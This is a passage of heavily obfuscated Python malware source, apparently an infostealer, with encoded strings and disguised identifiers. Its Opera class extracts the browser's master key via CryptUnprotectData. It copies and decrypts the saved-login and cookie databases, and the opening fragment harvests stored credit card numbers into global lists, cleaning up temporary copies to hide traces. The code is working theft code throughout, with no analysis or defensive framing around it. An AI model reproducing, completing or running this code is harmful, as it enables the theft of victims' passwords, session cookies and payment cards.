__𝙞𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙘𝙖𝙧𝗱_𝗻𝙪𝙢𝙗𝗲𝙧 = 𝙨𝗲𝙡𝘧.decrypt_password(𝘳𝘰𝘄[𝘪𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 837 - (𝙞𝘯𝘁(𝗢) + 𝙞), 𝘮𝙖𝘱(__𝘪𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝘪𝘁𝘦𝙧(__𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\xf15\x00\x00\x02\xd6\x01\x11')).decode())] * 3)), 𝗿𝗮𝗻𝘨𝙚(1)), __𝘪𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝘦𝙡𝘧.master_key)
            __𝗖𝘈𝙍𝘿𝙎__.append(𝙏𝘆𝗽𝗲𝘴.CreditCard(𝘳𝙤𝘸[𝘪𝗻𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 683 - (𝗶𝙣𝘁(𝘖) + 𝗶), 𝗺𝙖𝙥(__𝗶𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝘵𝘦𝘳(__𝙞𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝙣𝘨𝗲(0)), __𝙞𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘄[𝗶𝙣𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 675 - (𝘪𝘯𝘁(𝗢) + 𝘪), 𝙢𝘢𝙥(__𝙞𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘁𝗲𝗿(__𝘪𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcbJ6\x00\x00\x03p\x01L')).decode())] * 3)), 𝗿𝘢𝗻𝗴𝗲(1)), __𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝗼𝘸[𝗶𝗻𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 970 - (𝘪𝗻𝘁(𝘖) + 𝙞), 𝘮𝗮𝗽(__𝙞𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝘪𝙩𝘦𝗿(__𝗶𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0f\x894\x01\x00\x03"\x011')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝙚(1)), __𝙞𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙘𝙖𝗿𝘥_𝗻𝘂𝘮𝘣𝙚𝙧, 𝙧𝗼𝙬[𝙞𝘯𝘵.from_bytes(𝗺𝘢𝗽(lambda O, i: 998 - (𝗶𝘯𝘵(𝘖) + 𝙞), 𝘮𝙖𝘱(__𝗶𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝘵𝙚𝙧(__𝘪𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0f\xc96\x00\x00\x03B\x01?')).decode())] * 3)), 𝙧𝗮𝘯𝙜𝗲(1)), __𝘪𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝙤𝘯𝘯.close()
        𝗼𝘴.remove(__𝗶𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Opera:

    def __init__(self):
        𝙨𝙚𝘵𝙖𝙩𝘵𝙧(𝙨𝗲𝘭𝙛, 'roaming', 𝙤𝙨.getenv(__𝘪𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x0b\x0cs\n\x0cru\x0b\r\x0c\xb4\xb5\x05\x00\x17\xa5\x03\x89')).decode()))
        𝘀𝙚𝘵𝙖𝙩𝙩𝘳(𝘀𝙚𝗹𝘧, 'paths', {__𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK2v\xcaI\xceu\xcbKu\xb4\xb5\x05\x00\x1a \x03\xe8')).decode(): 𝘀𝙚𝘭𝗳.roaming + __𝙞𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xb5,\x8f\x8a\xf0\xca\xf0t\xf3+\x8b\xca\x0b2\x8e\x8c\xf0\xca\x89\x80\x89\xb9\xa6D\x02\xc5\r"\xc3\xbd\x8a\xa3\x02mm\x01H\x08\x0eT')).decode(), __𝘪𝘮𝙥𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK2v\xcaI\xceu\xb5\x05\x00\x0b\xbf\x02\x96')).decode(): 𝙨𝙚𝙡𝗳.roaming + __𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xb5,\x8f\x8a\xf0\xca\xf0t\xf3+\x8b\xca\x0b2\x8e\x8c\xf0\xca\x89@\x88\x19D\x86{\x15G\x05\xda\xda\x02\x00\x0f\xc8\r\t')).decode()})
        for (_, 𝘱𝙖𝙩𝙝) in 𝘀𝗲𝘭𝙛.paths.items():
            if not 𝗼𝘀.path.exists(𝘱𝘢𝙩𝗵):
                continue
            𝘀𝙚𝙩𝘢𝙩𝘁𝗿(𝙨𝘦𝙡𝘧, 'master_key', 𝘀𝙚𝙡𝙛.get_master_key(__𝘪𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝘱𝘢𝙩𝙝)))
            if not 𝘀𝘦𝙡𝗳.master_key:
                continue
            𝙤𝗽𝘦𝘳𝗮𝙩𝙞𝙤𝘯𝘴 = [𝙨𝗲𝘭𝗳.get_login_data, 𝘀𝗲𝙡𝘧.get_cookies, 𝘀𝙚𝗹𝙛.get_web_history, 𝘀𝘦𝗹𝗳.get_downloads, 𝙨𝗲𝗹𝗳.get_credit_cards]
            for 𝗼𝗽𝙚𝙧𝙖𝘁𝗶𝗼𝘯 in 𝙤𝗽𝗲𝘳𝘢𝘁𝘪𝗼𝙣𝘴:
                try:
                    𝗼𝘱𝘦𝙧𝙖𝘁𝘪𝘰𝘯(𝗽𝘢𝙩𝗵)
                except 𝗘𝘹𝘤𝙚𝘱𝘵𝙞𝘰𝙣 as e:
                    pass

    def get_master_key(self, path):
        if not 𝘰𝘴.path.exists(𝗽𝗮𝙩𝙝):
            return
        if __𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝘰𝗽𝙚𝗻(𝘱𝘢𝘵𝘩, __𝙞𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝙤𝘱𝗲𝙣(𝗽𝘢𝘵𝙝, __𝙞𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
            𝗰 = 𝙛.read()
        𝗹𝙤𝘤𝘢𝗹_𝙨𝙩𝙖𝘵𝗲 = 𝘫𝙨𝗼𝗻.loads(𝙘)
        𝘮𝙖𝙨𝙩𝗲𝗿_𝙠𝘦𝘆 = 𝗯𝙖𝙨𝘦64.b64decode(𝗹𝗼𝗰𝙖𝗹_𝘴𝙩𝘢𝘵𝙚[__𝙞𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝙞𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝙢𝙖𝘀𝙩𝗲𝙧_𝗸𝗲𝘺 = 𝗺𝙖𝘀𝘁𝙚𝗿_𝙠𝗲𝘺[𝘪𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 545 - (𝘪𝘯𝘁(𝘖) + 𝗶), 𝙢𝘢𝙥(__𝙞𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘁𝘦𝘳(__𝗶𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\t,\x07\x00\x03Q\x01k')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(1)), __𝗶𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝗺𝙖𝘴𝙩𝘦𝘳_𝘬𝗲𝘺 = 𝘊𝙧𝘺𝙥𝙩𝗨𝙣𝗽𝘳𝘰𝘁𝘦𝘤𝘵𝗗𝗮𝙩𝗮(𝘮𝗮𝘀𝘵𝘦𝙧_𝗸𝙚𝙮, None, None, None, 𝙞𝗻𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 376 - (𝙞𝗻𝘵(𝘖) + 𝘪), 𝗺𝗮𝙥(__𝙞𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝙩𝘦𝙧(__𝗶𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝘦(0)), __𝙞𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝘪𝙣𝙩.from_bytes(𝙢𝙖𝙥(lambda O, i: 918 - (𝗶𝙣𝘵(𝙊) + 𝘪), 𝙢𝘢𝙥(__𝗶𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘁𝙚𝘳(__𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0fq5\x06\x00\x02\xf9\x01\x1c')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝘦(1)), __𝗶𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝗺𝘢𝙨𝘵𝙚𝘳_𝙠𝗲𝙮

    def decrypt_password(self, buff, master_key):
        𝘪𝙫 = 𝙗𝙪𝗳𝘧[𝙞𝗻𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 465 - (𝘪𝘯𝘵(𝘖) + 𝗶), 𝙢𝗮𝗽(__𝙞𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝙞𝙩𝙚𝗿(__𝙞𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3s\x89\xac\x04\x00\x033\x01e')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝙚(1)), __𝗶𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝗶𝘯𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 982 - (𝙞𝘯𝘵(𝘖) + 𝘪), 𝗺𝗮𝙥(__𝗶𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝙩𝙚𝘳(__𝙞𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0f\x894\x06\x00\x03!\x010')).decode())] * 3)), 𝙧𝘢𝙣𝘨𝗲(1)), __𝘪𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝘱𝘢𝙮𝙡𝘰𝙖𝘥 = 𝙗𝘶𝗳𝘧[𝙞𝘯𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 984 - (𝗶𝘯𝘁(𝗢) + 𝘪), 𝗺𝘢𝗽(__𝘪𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝗶𝘁𝘦𝘳(__𝘪𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0f\x894\x05\x00\x03#\x012')).decode())] * 3)), 𝙧𝙖𝗻𝘨𝗲(1)), __𝗶𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘤𝗶𝗽𝗵𝘦𝘳 = 𝘈𝘌𝙎.new(𝗺𝘢𝘀𝘁𝗲𝙧_𝗸𝗲𝙮, 𝘈𝙀𝘚.MODE_GCM, 𝘪𝙫)
        𝗱𝙚𝙘𝗿𝘺𝘱𝘵𝙚𝙙_𝙥𝙖𝘴𝘴 = 𝙘𝙞𝙥𝗵𝘦𝘳.decrypt(𝙥𝙖𝘆𝘭𝘰𝙖𝘥)
        𝘥𝙚𝙘𝘳𝘆𝗽𝙩𝘦𝙙_𝙥𝘢𝙨𝘀 = 𝙙𝙚𝗰𝘳𝙮𝗽𝘵𝙚𝘥_𝘱𝗮𝘴𝘴[:-𝘪𝗻𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 585 - (𝗶𝙣𝘁(𝘖) + 𝘪), 𝙢𝙖𝙥(__𝘪𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝗶𝘁𝘦𝗿(__𝗶𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\x0b\x894\x05\x00\x03\x1f\x011')).decode())] * 3)), 𝗿𝗮𝘯𝙜𝙚(1)), __𝙞𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝘥𝙚𝘤𝘳𝘺𝘱𝘁𝙚𝗱_𝗽𝘢𝘴𝘴

    def get_login_data(self, path):
        𝘭𝘰𝘨𝘪𝘯_𝙙𝗯 = __𝙞𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xccK\x0c7I\x0frw3\x88\x0c\xb4\xb5\x05\x00?\xf6\x05\xf5')).decode().format(𝗽𝗮𝙩𝙝)
        if not 𝙤𝙨.path.exists(𝙡𝙤𝗴𝙞𝘯_𝙙𝗯):
            return
        𝘴𝗵𝙪𝙩𝘪𝙡.copy(𝘭𝘰𝗴𝗶𝗻_𝘥𝘣, __𝗶𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝘰𝘯𝗻 = 𝘴𝘲𝙡𝙞𝘁𝘦3.connect(__𝘪𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝘂𝘳𝘴𝙤𝙧 = 𝙘𝘰𝗻𝘯.cursor()
        𝙘𝙪𝘳𝘀𝗼𝗿.execute(__𝘪𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xb7\xacL\x0cO)H\xca\xb14L\xce-/\xf6\xf4\x08\xab\x8a\x8a\xf0*\x8d\x0c7\xcc\x890\x8e\xcaH\xf2\x08\xcb\xf1qv*\x8f\x8c\xf0\xabJ1\xb2\xac\x8cr\xb34\x8a\x0c\xaf0\x8c\nvr\x0f\xcd\xb6\xf4\xf3t\xaf(\x8b2\xca)M.\xb7\xb5\x05\x00\xb0\n\x1c4')).decode())
        for 𝙧𝙤𝘄 in 𝙘𝘶𝗿𝙨𝙤𝗿.fetchall():
            if not 𝘳𝘰𝘄[𝗶𝙣𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 446 - (𝗶𝗻𝘁(𝗢) + 𝘪), 𝘮𝗮𝘱(__𝙞𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝙩𝙚𝙧(__𝘪𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝗻𝗴𝗲(0)), __𝘪𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝙤𝘄[𝙞𝘯𝘁.from_bytes(𝗺𝘢𝗽(lambda O, i: 737 - (𝙞𝙣𝘁(𝘖) + 𝘪), 𝘮𝗮𝘱(__𝙞𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝘁𝙚𝗿(__𝘪𝘮𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xab\xf25\x02\x00\x03v\x01H')).decode())] * 3)), 𝘳𝙖𝗻𝘨𝘦(1)), __𝗶𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝙤𝙬[𝘪𝘯𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 532 - (𝗶𝘯𝘁(𝗢) + 𝘪), 𝗺𝗮𝙥(__𝘪𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝘵𝗲𝙧(__𝘪𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0b\xf1-\x07\x00\x03I\x01g')).decode())] * 3)), 𝘳𝙖𝗻𝘨𝗲(1)), __𝘪𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙥𝗮𝘴𝙨𝙬𝘰𝘳𝙙 = 𝘀𝗲𝙡𝙛.decrypt_password(𝗿𝘰𝘄[𝘪𝘯𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 863 - (𝗶𝙣𝙩(𝗢) + 𝗶), 𝙢𝘢𝗽(__𝗶𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝙩𝗲𝗿(__𝗶𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3w\x89\xac\x00\x00\x036\x01e')).decode())] * 3)), 𝘳𝗮𝗻𝗴𝘦(1)), __𝘪𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝙚𝘭𝙛.master_key)
            __𝗟𝗢𝙂𝗜𝘕𝘚__.append(𝙏𝘺𝙥𝘦𝘀.Login(𝘳𝗼𝘸[𝗶𝘯𝘵.from_bytes(𝙢𝘢𝙥(lambda O, i: 778 - (𝘪𝘯𝘁(𝙊) + 𝘪), 𝙢𝗮𝗽(__𝘪𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝗶𝙩𝙚𝙧(__𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝗻𝙜𝙚(0)), __𝗶𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝙬[𝘪𝘯𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 358 - (𝙞𝘯𝙩(𝙊) + 𝙞), 𝗺𝗮𝗽(__𝗶𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝙞𝘵𝙚𝙧(__𝙞𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xad\n5\x06\x00\x03\x83\x01P')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(1)), __𝘪𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗽𝘢𝘴𝙨𝘸𝘰𝙧𝙙))
        𝙘𝘂𝗿𝘀𝗼𝙧.close()
        𝙘𝙤𝗻𝘯.close()
        𝘰𝙨.remove(__𝙞𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path):
        𝙘𝗼𝗼𝙠𝘪𝘦𝙨_𝗱𝘣 = __𝘪𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK56L\x0e\xc9\r3H1\xb2\xacL4\xacpI2\xb2,J\x0c\x0f\xab\x02\x00^6\x07\xd1')).decode().format(𝗽𝘢𝘁𝘩)
        if not 𝗼𝘀.path.exists(𝘤𝘰𝙤𝗸𝗶𝘦𝙨_𝙙𝙗):
            return
        𝙨𝙝𝘂𝙩𝙞𝙡.copy(𝘤𝗼𝘰𝙠𝗶𝗲𝘀_𝘥𝘣, __𝙞𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())
